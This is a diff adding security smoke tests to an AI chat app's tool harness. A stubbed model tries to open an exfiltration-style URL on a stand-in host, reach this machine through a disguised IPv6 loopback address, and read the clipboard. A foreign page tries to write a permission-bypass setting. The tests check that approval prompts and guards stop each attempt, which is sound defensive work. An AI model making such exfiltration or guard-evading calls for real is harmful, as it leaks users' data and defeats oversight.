@@ -92,6 +92,19 @@ function stubReply(body) {
       tool_calls: [{ id: 'call_plan_write', type: 'function', function: { name: 'workspace_write', arguments: JSON.stringify({ path: 'planned.md', content: 'planned line\n' }) } }],
     };
   }
+  // Where data may go: a page on an address the model made up (asks), a hidden spelling of this
+  // machine given by the user (no prompt, refused by the address guard), and the clipboard (asks).
+  const webOpen = tools.find((tool) => tool?.function?.name === 'web_open');
+  const clipboardRead = tools.find((tool) => tool?.function?.name === 'computer_clipboard_read');
+  const probe = (tag, name, args) => (last.role === 'tool'
+    ? { role: 'assistant', content: `${tag} said: ${last.content}` }
+    : { role: 'assistant', content: null, tool_calls: [{ id: `call_${tag}`, type: 'function', function: { name, arguments: JSON.stringify(args) } }] });
+  if (webOpen && said('open a made-up page')) return probe('egress', 'web_open', { url: 'https://collect.invalid/?d=made-up-secret' });
+  if (webOpen && said('open the hidden local address')) {
+    const given = /http:\/\/\[[^\s]+/.exec(messages.find((message) => message.role === 'user' && String(message.content).includes('hidden local'))?.content || '');
+    return probe('local', 'web_open', { url: given ? given[0] : 'http://[::ffff:127.0.0.1]/' });
+  }
+  if (clipboardRead && said('read my clipboard')) return probe('clipboard', 'computer_clipboard_read', {});
   // First completion gets its usage; the next completion fails, exercising partial billing.
   if (last.role === 'tool' && messages.some((message) => typeof message?.content === 'string' && message.content.includes('fail after tool'))) {
     return { role: 'assistant', content: 'Partial after a billed tool round.', failAfter: 'stub second round failed' };
@@ -448,6 +461,21 @@ async function run(win) {
       });
       const mcpTested = mcpSaved.ok ? await api.mcp.test({ id: mcpSaved.data.id }) : mcpSaved;
       const mcpListed = await api.mcp.list();
+      // A new server's own "read-only" labels are not trusted: its echo asks even in Basic, and
+      // the prompt says why. Trusting the server makes the same call run on its own.
+      const untrustedPending = api.provider.send({ requestId: 'smoke-tools-untrusted', messages: [{ role: 'user', content: 'Please use echo.' }] });
+      let untrustedAsked = false;
+      for (let i = 0; i < 100 && !untrustedAsked; i += 1) {
+        untrustedAsked = Boolean(document.querySelector('#tool-approval-dialog')?.open);
+        if (!untrustedAsked) await new Promise((resolve) => setTimeout(resolve, 50));
+      }
+      const untrustedSummary = document.querySelector('#approval-summary')?.textContent || '';
+      document.querySelector('#approval-once')?.click();
+      const untrustedReply = await untrustedPending;
+      const mcpTrusted = mcpSaved.ok ? await api.mcp.save({
+        id: mcpSaved.data.id, name: 'Smoke tools', transport: 'stdio', command: ${JSON.stringify(process.execPath)},
+        args: [${JSON.stringify(FAKE_MCP_SERVER)}], enabled: true, trustReadOnly: true,
+      }) : mcpSaved;
       const toolChat = await api.provider.send({ requestId: 'smoke-tools', messages: [{ role: 'user', content: 'Please use echo.' }] });
       // Manual mode: the tool call waits for the approval prompt in this window; Allow runs it.
       const settingsBefore = await api.store.get('settings');
@@ -468,6 +496,35 @@ async function run(win) {
       const denied = await denyPending;
       await api.store.set('settings', settingsBefore || {});
       if (mcpSaved.ok) await api.mcp.remove({ id: mcpSaved.data.id });
+
+      // Where data may go (Basic): an address the model made up asks first, with "Allow this
+      // site"; a hidden spelling of this machine given by the user is not asked about but refused
+      // by the address guard; the clipboard asks every time.
+      const waitPrompt = async (ms) => {
+        for (let waited = 0; waited < ms; waited += 50) {
+          if (document.querySelector('#tool-approval-dialog')?.open) return true;
+          await new Promise((resolve) => setTimeout(resolve, 50));
+        }
+        return false;
+      };
+      const egressPending = api.provider.send({ requestId: 'smoke-egress', messages: [{ role: 'user', content: 'Please open a made-up page.' }] });
+      const egressAsked = await waitPrompt(6000);
+      const egressTitle = document.querySelector('#approval-title')?.textContent || '';
+      const egressAllowLabel = document.querySelector('#approval-all')?.textContent || '';
+      const egressAllowShown = !document.querySelector('#approval-all')?.hidden;
+      document.querySelector('#approval-deny')?.click();
+      const egressReply = await egressPending;
+      const localPending = api.provider.send({ requestId: 'smoke-local', messages: [{ role: 'user', content: 'Please open the hidden local address http://[::ffff:127.0.0.1]:${port}/v1/models for me.' }] });
+      const localAsked = await waitPrompt(1500);
+      if (localAsked) document.querySelector('#approval-deny')?.click();
+      const localReply = await localPending;
+      const clipboardPending = api.provider.send({ requestId: 'smoke-clipboard', messages: [{ role: 'user', content: 'Please read my clipboard.' }] });
+      const clipboardAsked = await waitPrompt(6000);
+      const clipboardSummary = document.querySelector('#approval-summary')?.textContent || '';
+      document.querySelector('#approval-deny')?.click();
+      const clipboardReply = await clipboardPending;
+      // The page may not use the camera, the microphone, notifications and the like.
+      const notificationPermission = typeof Notification === 'function' ? await Notification.requestPermission() : 'unavailable';
       // Built-in workspace tools: none without a folder; with one, the model is told its name and
       // can list it (read-only, so Basic runs it without asking).
       const folderReply = await api.provider.send({ requestId: 'smoke-ws-folder', messages: [{ role: 'user', content: 'which folder am I in?' }] });
@@ -946,6 +1003,21 @@ async function run(win) {
         crumbMetrics,
         compactContextPill,
         failedAutoDraftKept,
+        untrustedAsked,
+        untrustedSummary,
+        untrustedText: untrustedReply && untrustedReply.ok ? untrustedReply.data.text : (untrustedReply?.error?.message || null),
+        mcpTrustedFlag: Boolean(mcpTrusted && mcpTrusted.ok && mcpTrusted.data.trustReadOnly === true),
+        egressAsked,
+        egressTitle,
+        egressAllowLabel,
+        egressAllowShown,
+        egressText: egressReply && egressReply.ok ? egressReply.data.text : (egressReply?.error?.message || null),
+        localAsked,
+        localText: localReply && localReply.ok ? localReply.data.text : (localReply?.error?.message || null),
+        clipboardAsked,
+        clipboardSummary,
+        clipboardText: clipboardReply && clipboardReply.ok ? clipboardReply.data.text : (clipboardReply?.error?.message || null),
+        notificationPermission,
         specChipShown,
         specAnswered,
         specToolCalls,
@@ -1005,6 +1077,24 @@ async function run(win) {
     })()`);
   } catch (error) {
     errors.push(`e2e failed: ${error.message}`);
+  }
+  // Another page with the same bridge (as if something ever loaded other content): every channel
+  // refuses it, the state store included.
+  let foreign = null;
+  try {
+    const { BrowserWindow } = require('electron');
+    const other = new BrowserWindow({ show: false, webPreferences: { preload: path.join(__dirname, '..', 'preload.js'), contextIsolation: true, sandbox: true } });
+    await other.loadURL('data:text/html,<p>not the app</p>');
+    foreign = await other.webContents.executeJavaScript(`(async () => {
+      const api = window.scalemaxAPI;
+      const provider = await api.provider.get();
+      const stored = await api.store.get('settings');
+      const written = await api.store.set('settings', { permission: 'bypass', bypassConsent: true });
+      return { providerCode: provider && provider.error ? provider.error.code : null, storeValue: stored === undefined ? null : stored, storeWritten: written };
+    })()`);
+    other.destroy();
+  } catch (error) {
+    errors.push(`foreign window check failed: ${error.message}`);
   }
   const wsNotesOnDisk = (() => {
     try { return fs.readFileSync(path.join(wsToolsDir, '.scalemax', 'SCALEMAX.md'), 'utf8'); } catch { return null; }
@@ -1280,6 +1370,20 @@ async function run(win) {
       && /12 in · 6 out · \$0\.000024/.test(e2e.metricsUi) && /tokens · \$/.test(e2e.crumbMetrics)
       && e2e.compactContextPill === 'Context compacted' && e2e.failedAutoDraftKept === true),
     specApi: probe.specMethods.length === 3 && probe.specsControls === true,
+    // An MCP server's own read-only label is a claim until the user trusts the server.
+    mcpLabelsUntrusted: Boolean(e2e && e2e.untrustedAsked && /cannot check that/.test(e2e.untrustedSummary)
+      && e2e.untrustedText === 'tool said: smoke-echo' && e2e.mcpTrustedFlag),
+    // A page on an address the model made up asks first (with "Allow this site"), and denied, it
+    // never opens; a hidden spelling of this machine is refused by the address guard.
+    egressAsks: Boolean(e2e && e2e.egressAsked && e2e.egressTitle === 'Open an address on collect.invalid?'
+      && e2e.egressAllowShown && e2e.egressAllowLabel === 'Allow collect.invalid in this reply'
+      && /^egress said: Error: the user denied/.test(e2e.egressText || '')),
+    addressGuard: Boolean(e2e && e2e.localAsked === false && /^local said: Error: .*private network/.test(e2e.localText || '')),
+    clipboardAsks: Boolean(e2e && e2e.clipboardAsked && /password/.test(e2e.clipboardSummary)
+      && /^clipboard said: Error: the user denied/.test(e2e.clipboardText || '')),
+    webPermissionsDenied: Boolean(e2e && e2e.notificationPermission === 'denied'),
+    untrustedSenderRefused: Boolean(foreign && foreign.providerCode === 'UNTRUSTED_SENDER' && foreign.storeValue === null
+      && foreign.storeWritten === false),
     // The model writes requirements, design and tasks as project files and ticks a task off; the
     // documents land in the reply's changes like any other edit.
     specWriting: Boolean(e2e && e2e.specAnswered && e2e.specToolCalls === 'spec_write:ok,spec_write:ok,spec_write:ok,spec_task:ok'
